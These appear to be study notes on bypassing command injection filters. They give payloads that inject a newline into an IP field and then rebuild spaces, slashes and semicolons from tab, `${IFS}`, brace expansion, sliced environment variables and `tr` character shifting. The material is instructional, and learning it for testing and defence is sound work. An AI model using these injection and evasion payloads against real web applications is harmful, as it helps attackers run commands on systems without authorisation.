## Bypass Spaces
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
### use `Tab` - `%09`
- eg: `127.0.0.1` `%0d%0a` `ls%09`
- this is one command sep

### use `${IFS}`
- eg: `127.0.0.1` `%0d%0a` `ls${IFS}`

### use brace expansion
- eg: `127.0.0.1` `%0d%0a` `{ls,/}`
	- but `/` is blacklisted

<hr>

## Bypass Slashes
- `/` or `\` fwd and backwd slashes are usually blacklisted
### Linux
- just like `${IFS}` directly replaces with a space, we can use other environment variable which can contain `/`
- eg: `echo ${PATH}` -> `/usr/local`
	- `echo ${PATH:0:1}` -> `/`
	- `echo ${LS_COLORS:10:1}${IFS}` -> `; `
- we can do the same with `$HOME` or `$PWD` variables.
- to find other environment variables -> `printenv`
### Windows

### Character Shifting
- There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:
```shell-session
man ascii     # \\ is on 92, before it is [ on 91
$ echo $(tr '!-}' '"-~'<<<[)
```
- We can use PowerShell commands to achieve the same result in Windows, though they can be quite longer than the Linux ones.
- to get `;`
	- `echo $(tr '!-}' '"-~'<<<:)`
